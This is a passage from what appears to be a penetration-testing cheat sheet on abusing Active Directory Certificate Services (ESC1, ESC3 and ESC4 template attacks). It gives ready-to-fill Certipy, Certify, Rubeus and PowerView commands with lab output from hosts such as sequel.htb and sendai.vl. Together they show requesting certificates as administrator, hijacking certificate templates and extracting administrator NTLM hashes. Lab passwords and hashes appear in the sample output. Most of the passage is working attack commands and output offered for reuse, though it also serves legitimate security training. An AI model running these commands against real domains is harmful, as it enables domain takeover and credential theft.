certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -ns <DC_IP> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper@sequel.htb' -hashes '98981eed8e9ce0763bb3c5b3c7ed5945' -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size 4096 -sid S-1-5-21-4078382237-1492182817-2568127209-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -ns <DC_IP> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE> -key-size 4096 -sid <SID>
```

```console {class="sample-code"}
$ certipy-ad req -u 'ryan.cooper@sequel.htb' -k -target dc.sequel.htb -dc-host dc.sequel.htb -ns 10.129.33.22 -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication -key-size 4096 -sid S-1-5-21-4078382237-1492182817-2568127209-500
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. Get NTLM Hash

```console
sudo ntpdate -s <DC_IP> && certipy-ad auth -pfx <TARGET_USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s 10.129.33.22 && certipy-ad auth -pfx administrator.pfx -domain sequel.htb -dc-ip 10.129.33.22
[sudo] password for kali: 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```

{{< /tabcontent >}}
{{< tabcontent set5 tab2 >}}

#### 1. Set Subject Alternative Name (SAN)

```console
.\Certify.exe request --ca <DOMAIN_NETBIOS_NAME>\<CA> --template <VULN_TEMPLATE> --upn <TARGET_USER>
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request --ca SEQUEL.HTB\sequel-DC-CA --template UserAuthentication --upn administrator

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Request a certificate

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Subject Alt Name(s)     : administrator

[*] Certificate Authority   : SEQUEL.HTB\sequel-DC-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 27

[*] Certificate (PFX)       :

MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---IAeQBhAG4ALgBDAG8AbwBwAGUAcgAAAAAAAAAAAAAAAAAAAAA=

Certify completed in 00:00:04.3277620
```

#### 2. Get NTLM Hash

```console
.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_PFX> /getcredentials /show /nowrap
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Ryan.Cooper\Documents> .\rubeus.exe asktgt /user:administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---IAeQBhAG4ALgBDAG8AbwBwAGUAcgAAAAAAAAAAAAAAAAAAAAA= /getcredentials /show /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::fd46:191e:1ebb:d867%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAg---[SNIP]---hUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  10/29/2025 5:46:06 AM
  EndTime                  :  10/29/2025 3:46:06 PM
  RenewTill                :  11/5/2025 4:46:06 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  iBzJoaSp3oeH1mytp8l45Q==
  ASREP (key)              :  F7210CD81F1D64AE8689EBF71822A6D7

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

{{< /tabcontent >}}

#### Create ESC1 Vulnerable Template

{{< tab set7 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set7 tab1 >}}

#### 1. Import ADCSTemplate Module

```console
import-module .\ADCSTemplate.psm1
```

#### 2. Create Template with msPKI-Certificate-Name-Flag Modified

```console
Export-ADCSTemplate -displayName <VULN_TEMPLATE> > template.json
```

```console
$template = cat template.json -raw | ConvertFrom-Json
```

```console
$template.'msPKI-Certificate-Name-Flag' = 0x1
```

```console
$template | ConvertTo-Json | Set-Content template_mod.json
```

#### 3. Create a New Certificate Template

```console
New-ADCSTemplate -DisplayName 'VULN_ESC1' -Publish -JSON (cat template_mod.json -raw)
```

#### 4. Allow Target User to Enroll in the Certificate

```console
Set-ADCSTemplateACL -DisplayName 'VULN_ESC1' -type allow -identity '<DOMAIN>\<USER>' -enroll
```

#### 5. Set Subject Alternative Name (SAN)

```console
.\Certify.exe request --ca <SERVER>\<CA> --template VULN_ESC1 --upn administrator
```

#### 6. Get NTLM Hash

```console
.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
```

<small>*Ref: [ADCSTemplate](https://github.com/GoateePFE/ADCSTemplate)*</small>

{{< /tabcontent >}}

---

### ESC3: Enrollment Agent Certificate Template

{{< tab set8 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set8 tab1 >}}

#### 1. Obtain an Enrollment Agent Certificate

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template <VULN_TEMPLATE>
```

#### 2. Request a Certificate on behalf of the Target User

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'User' -pfx '<USER>.pfx' -on-behalf-of '<DOMAIN_NETBIOS_NAME>\<TARGET_USER>'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -ca <CA> -template 'User' -pfx '<USER>.pfx' -on-behalf-of '<DOMAIN_NETBIOS_NAME>\<TARGET_USER>'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User' -pfx '<USER>.pfx' -on-behalf-of '<DOMAIN_NETBIOS_NAME>\<TARGET_USER>'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User' -pfx '<USER>.pfx' -on-behalf-of '<DOMAIN_NETBIOS_NAME>\<TARGET_USER>'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -ca <CA> -template 'User' -pfx '<USER>.pfx' -on-behalf-of '<DOMAIN_NETBIOS_NAME>\<TARGET_USER>'
```

#### 3. Get NTLM Hash

```console
certipy-ad auth -pfx <TARGET_USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

{{< /tabcontent >}}

---

### ESC4: Template Hijacking

{{< tab set9 tab1 >}}Linux{{< /tab >}}
{{< tab set9 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set9 tab1 >}}

#### 1. Modify Template to ESC1 Vulnerable State

```console {class="password"}
# Password
certipy-ad template -u '<USER>' -p '<PASSWORD>' -target <TARGET> -dc-ip <DC_IP> -template '<VULN_TEMPLATE>' -write-default-configuration -no-save
```

```console {class="sample-code"}
$ certipy-ad template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -dc-ip 10.129.234.66 -template 'SendaiComputer' -write-default-configuration -no-save
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

```console {class="ntlm"}
# NTLM
certipy-ad template -u '<USER>' -hashes '<HASH>' -target <TARGET> -dc-ip <DC_IP> -template '<VULN_TEMPLATE>' -write-default-configuration -no-save
```

```console {class="sample-code"}
$ certipy-ad template -u 'clifford.davey' -hashes '13cee2652d9af0b63e3ebda229edf2ed' -target dc.sendai.vl -dc-ip 10.129.234.66 -template 'SendaiComputer' -write-default-configuration -no-save
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad template -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -template '<VULN_TEMPLATE>' -write-default-configuration -no-save
```

```console {class="sample-code"}
$ certipy-ad template -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -k -target dc.sendai.vl -dc-ip 10.129.234.66 -dc-host dc.sendai.vl -ns 10.129.234.66 -template 'SendaiComputer' -write-default-configuration -no-save
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad template -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -template '<VULN_TEMPLATE>' -write-default-configuration -no-save
```

```console {class="sample-code"}
$ certipy-ad template -u 'clifford.davey@sendai.vl' -hashes '13cee2652d9af0b63e3ebda229edf2ed' -k -target dc.sendai.vl -dc-ip 10.129.234.66 -dc-host dc.sendai.vl -ns 10.129.234.66 -template 'SendaiComputer' -write-default-configuration -no-save
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad template -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-ip <DC_IP> -dc-host <DC> -ns <DC_IP> -template '<VULN_TEMPLATE>' -write-default-configuration -no-save
```

```console {class="sample-code"}
$ certipy-ad template -u 'clifford.davey@sendai.vl' -k -target dc.sendai.vl -dc-ip 10.129.234.66 -dc-host dc.sendai.vl -ns 10.129.234.66 -template 'SendaiComputer' -write-default-configuration -no-save
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```

#### 2. Request a Certificate Using the Modified Template

```console {class="password"}
# Password
certipy-ad req -u '<USER>' -p '<PASSWORD>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -target dc.sendai.vl -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 9
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sendai.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm"}
# NTLM
certipy-ad req -u '<USER>' -hashes '<HASH>' -target <TARGET> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'clifford.davey' -hashes '13cee2652d9af0b63e3ebda229edf2ed' -target dc.sendai.vl -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sendai.vl.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sendai.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -dc-host <DC> -ns <DC_IP> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'clifford.davey@sendai.vl' -p 'RFmoB2WplgE_3p' -k -target dc.sendai.vl -dc-host dc.sendai.vl -ns 10.129.234.66 -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sendai.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -dc-host <DC> -ns <DC_IP> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'clifford.davey@sendai.vl' -hashes '13cee2652d9af0b63e3ebda229edf2ed' -k -target dc.sendai.vl -dc-host dc.sendai.vl -ns 10.129.234.66 -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sendai.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad req -u '<USER>@<DOMAIN>' -k -target <TARGET> -dc-host <DC> -ns <DC_IP> -upn <TARGET_USER>@<DOMAIN> -ca <CA> -template <VULN_TEMPLATE>
```

```console {class="sample-code"}
$ certipy-ad req -u 'clifford.davey@sendai.vl' -k -target dc.sendai.vl -dc-host dc.sendai.vl -ns 10.129.234.66 -upn Administrator@sendai.vl -ca sendai-DC-CA -template SendaiComputer
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@sendai.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

#### 3. Get NTLM Hash

```console
certipy-ad auth -pfx <TARGET_USER>.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad auth -pfx administrator.pfx -domain sendai.vl -dc-ip 10.129.234.66
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sendai.vl'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```

{{< /tabcontent >}}
{{< tabcontent set9 tab2 >}}

#### 1. Import Module

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Clifford.Davey\Documents> . .\PowerView.ps1
```

#### 2. Modify Template to a Vulnerable State

```console
Add-DomainObjectAcl -TargetIdentity <VULN_TEMPLATE> -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=<EXAMPLE>,DC=<COM>"
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Clifford.Davey\Documents> Add-DomainObjectAcl -TargetIdentity SendaiComputer -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP:
//CN=Configuration,DC=sendai,DC=vl"
```

```console
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<EXAMPLE>,DC=<COM>" -Identity <VULN_TEMPLATE> -XOR @{'mspki-certificate-name-flag'=1} -Verbose
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Clifford.Davey\Documents> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sendai,DC=vl" -Identity SendaiComputer -XOR @{'msp
ki-certificate-name-flag'=1} -Verbose
```

```console
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<EXAMPLE>,DC=<COM>" -Identity <VULN_TEMPLATE> -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Clifford.Davey\Documents> Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sendai,DC=vl" -Identity SendaiComputer -Set @{'msp
ki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```

#### 3. Request a Certificate Using the Modified Template

```console
.\Certify.exe request --ca <DOMAIN_NETBIOS_NAME>\<CA> --template <VULN_TEMPLATE> --upn <TARGET_USER>@<DOMAIN> --sid <SID>
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Clifford.Davey\Documents> .\Certify.exe request --ca dc.sendai.vl\sendai-DC-CA --template SendaiComputer --upn administrator@sendai.vl --sid S-1-5-21-3085872742-570972823-736764132-500

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Request a certificate

[*] Current user context    : SENDAI\Clifford.Davey
[*] No subject name specified, using current context as subject.

[*] Template                : SendaiComputer
[*] Subject                 : CN=Clifford Davey, OU=staff, DC=sendai, DC=vl
[*] Subject Alt Name(s)     : administrator@sendai.vl
[*] Sid Extension           : S-1-5-21-3085872742-570972823-736764132-500

[*] Certificate Authority   : dc.sendai.vl\sendai-DC-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 19

[*] Certificate (PFX)       :

MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---BmAGYAbwByAGQAIABEAGEAdgBlAHkAAAAAAAAAAAAAAAAAAAAA

Certify completed in 00:00:04.0930718
```

#### 4. Get NTLM Hash

```console
.\rubeus.exe asktgt /user:<TARGET_USER> /certificate:<BASE64_PFX> /ptt /nowrap /getcredentials
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Clifford.Davey\Documents> .\rubeus.exe asktgt /user:administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w---[SNIP]---BmAGYAbwByAGQAIABEAGEAdgBlAHkAAAAAAAAAAAAAAAAAAAAA /ptt /nowrap /getcredentials

